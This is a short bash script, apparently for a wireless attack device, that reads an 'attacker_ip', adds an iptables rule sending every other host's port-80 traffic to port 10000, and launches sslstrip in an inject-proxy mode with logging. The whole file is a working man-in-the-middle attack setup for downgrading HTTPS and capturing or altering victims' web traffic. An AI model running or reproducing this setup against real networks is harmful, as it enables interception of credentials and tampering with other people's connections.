#!/bin/bash

# setup vars
export PATH=$PATH:/sd/usr/bin:/sd/usr/sbin
attacker_ip="$(cat proxy/attacker_ip.txt)"

# set our iptables redirect
iptables -t nat -A PREROUTING ! -s "${attacker_ip}" -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000

# start sslstrip/inject proxy
cd proxy
python sslstrip.py -s -k -f -w /sd/tmp/proxy_inject.log 2>&1 

exit 0
